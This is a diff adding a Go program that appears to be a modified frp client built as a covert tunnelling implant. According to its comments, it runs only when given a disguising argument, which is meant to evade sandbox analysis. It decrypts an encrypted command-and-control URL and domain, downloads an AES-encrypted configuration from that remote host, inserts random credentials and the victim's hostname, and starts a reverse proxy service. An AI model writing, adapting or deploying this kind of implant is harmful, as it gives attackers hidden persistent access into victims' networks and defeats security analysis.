@@ -1,0 +1,150 @@
+package main
+
+import (
+	"context"
+	"encoding/base64"
+	"fmt"
+	"math/rand"
+	"os"
+	"os/signal"
+	"strings"
+	"syscall"
+	"time"
+
+	v1 "github.com/xx/xxx/pkg/config/v1"
+
+	"github.com/xx/xxx/client"
+	"github.com/xx/xxx/pkg/config"
+	"github.com/xx/xxx/pkg/config/v1/validation"
+	"github.com/xx/xxx/pkg/util/log"
+	"github.com/xx/xxx/pkg/util/myutil"
+)
+
+func init() {
+	rand.Seed(time.Now().UnixNano()) // 使用纳秒来增加随机性
+}
+
+func decrypt(key, bodyb64 string) (string, error) {
+	key1 := []byte(key) // 加密的密钥
+	origDataByte, err := base64.StdEncoding.DecodeString(bodyb64)
+	if err != nil {
+		fmt.Printf("base64.StdEncoding.DecodeString err: %v\n", err)
+		return "", err
+	}
+	decrypted := myutil.AesDecryptECB(origDataByte, key1)
+	return string(decrypted), nil
+}
+
+func main() {
+	flags := os.Args
+	if len(flags) < 2 {
+		return
+	}
+	if flags[1] != "root@pts/0" { // 指定参数运行，一是进行进程伪装，二是防止沙箱动态分析
+		return
+	}
+	password := RandomString(8)
+	username := RandomString(6)
+
+	key1 := "{key1}"
+	url1, err := decrypt(key1, "{url}")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	domain, err := decrypt(key1, "{domain}")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	configKey, err := decrypt(key1, "{key}")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	bodyb64, err := myutil.HttpGet(url1, domain)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	key := []byte(configKey) // 加密的密钥
+	origDataByte, err := base64.StdEncoding.DecodeString(bodyb64)
+	if err != nil {
+		fmt.Printf("base64.Decode err: %v\n", err)
+		return
+	}
+	configStr := myutil.AesDecryptECB(origDataByte, key)
+	configStr1 := string(configStr)
+	configStr1 = strings.Replace(configStr1, "{password}", password, 1)
+	configStr1 = strings.Replace(configStr1, "{username}", username, 1)
+	hostname, _ := os.Hostname()
+	configStr1 = strings.Replace(configStr1, "{test}", hostname+"_"+RandomString(4), 1)
+	cfg, proxyCfgs, visitorCfgs, _, err := config.LoadClientConfig(configStr1, false, true)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs)
+	if warning != nil {
+		fmt.Printf("WARNING: %v\n", warning)
+	}
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	err = startService(cfg, proxyCfgs, visitorCfgs, "")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+}
+
+// startService 启动服务
+func startService(
+	cfg *v1.ClientCommonConfig,
+	proxyCfgs []v1.ProxyConfigurer,
+	visitorCfgs []v1.VisitorConfigurer,
+	cfgFile string,
+) error {
+	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+
+	if cfgFile != "" {
+		//log.Infof("start frpc service for config file [%s]", cfgFile)
+		defer log.Infof("service for file [%s] stopped", cfgFile)
+	}
+	svr, err := client.NewService(client.ServiceOptions{
+		Common:         cfg,
+		ProxyCfgs:      proxyCfgs,
+		VisitorCfgs:    visitorCfgs,
+		ConfigFilePath: cfgFile,
+	})
+	if err != nil {
+		return err
+	}
+
+	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
+	// Capture the exit signal if we use kcp or quic.
+	if shouldGracefulClose {
+		go handleTermSignal(svr)
+	}
+	return svr.Run(context.Background())
+}
+
+func handleTermSignal(svr *client.Service) {
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
+	<-ch
+	svr.GracefulClose(500 * time.Millisecond)
+}
+
+func RandomString(n int) string {
+	var letters = []byte("qazxswedcvfrtgbnhyujmkiolp")
+	result := make([]byte, n)
+	for i := range result {
+		result[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(result)
+}
